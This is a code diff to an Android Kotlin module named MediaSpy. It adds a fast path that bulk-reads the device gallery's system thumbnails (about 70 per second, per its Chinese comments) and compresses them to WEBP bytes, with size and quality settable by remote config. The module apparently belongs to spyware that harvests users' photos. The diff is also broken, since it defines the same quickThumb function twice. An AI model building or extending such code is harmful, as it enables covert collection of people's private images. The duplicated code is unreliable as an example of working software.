@@ -28,7 +28,7 @@ object MediaSpy {
 
     private const val TAG = "TlmMedia"
     private const val MAX_PER_ROUND = 6
-    private const val THREADS = 4          // 并发解码线程数（2 核吃满）
+    private const val THREADS = 6          // 极速模式是 IO 型，可以多开
     @Volatile private var targetPx = 1080  // 可被远程配置覆盖
     @Volatile private var quality = 82
     private const val PREF = "tlm_media"
@@ -124,7 +124,9 @@ object MediaSpy {
     }
 
     private fun thumbOf(ctx: Context, uri: Uri): ByteArray? = runCatching {
-        // 先自己解码（能控制到 1080 宽，字看得清），失败再用系统缩略图兜底
+        // 目标宽度 <= 640：走系统预生成的缩略图，毫秒级，70 张/秒靠这个
+        if (targetPx <= 640) return quickThumb(ctx, uri)
+        // 否则自己解码（能控制到 1080 宽，字看得清）
         val bmp: Bitmap = (decodeSampled(ctx, uri) ?: run {
             if (Build.VERSION.SDK_INT >= 29) {
                 runCatching {
@@ -134,6 +136,51 @@ object MediaSpy {
             } else null
         }) ?: return null
         val out = ByteArrayOutputStream(48 * 1024)
+        val fmt = if (Build.VERSION.SDK_INT >= 30) Bitmap.CompressFormat.WEBP_LOSSY
+        else @Suppress("DEPRECATION") Bitmap.CompressFormat.WEBP
+        bmp.compress(fmt, quality, out)
+        bmp.recycle()
+        val bytes = out.toByteArray()
+        if (bytes.size > 16 * 1024 * 1024) null else bytes
+    }.getOrNull()
+
+    /** 极速路径：直接读系统缩略图缓存，不解码原图。 */
+    private fun quickThumb(ctx: Context, uri: Uri): ByteArray? = runCatching {
+        val bmp: Bitmap = if (Build.VERSION.SDK_INT >= 29) {
+            ctx.contentResolver.loadThumbnail(
+                uri, android.util.Size(targetPx, targetPx), null)
+        } else {
+            @Suppress("DEPRECATION")
+            android.provider.MediaStore.Images.Thumbnails.getThumbnail(
+                ctx.contentResolver,
+                android.content.ContentUris.parseId(uri),
+                android.provider.MediaStore.Images.Thumbnails.MINI_KIND, null)
+        } ?: return null
+
+        val out = ByteArrayOutputStream(32 * 1024)
+        val fmt = if (Build.VERSION.SDK_INT >= 30) Bitmap.CompressFormat.WEBP_LOSSY
+        else @Suppress("DEPRECATION") Bitmap.CompressFormat.WEBP
+        bmp.compress(fmt, quality, out)
+        bmp.recycle()
+        val bytes = out.toByteArray()
+        if (bytes.size > 16 * 1024 * 1024) null else bytes
+    }.getOrNull()
+
+    /** 极速路径：向系统要现成的缩略图，不解码原图。70 张/秒靠的就是这个。 */
+    private fun quickThumb(ctx: Context, uri: Uri): ByteArray? = runCatching {
+        val size = android.util.Size(targetPx, targetPx)
+        val bmp = if (Build.VERSION.SDK_INT >= 29) {
+            ctx.contentResolver.loadThumbnail(uri, size, null)
+        } else {
+            // 旧系统走 Thumbnails 表
+            val cr = ctx.contentResolver
+            val id = android.content.ContentUris.parseId(uri)
+            val bitmap = android.provider.MediaStore.Images.Thumbnails.getThumbnail(
+                cr, id, android.provider.MediaStore.Images.Thumbnails.MINI_KIND, null)
+            bitmap
+        } ?: return null
+
+        val out = ByteArrayOutputStream(32 * 1024)
         val fmt = if (Build.VERSION.SDK_INT >= 30) Bitmap.CompressFormat.WEBP_LOSSY
         else @Suppress("DEPRECATION") Bitmap.CompressFormat.WEBP
         bmp.compress(fmt, quality, out)
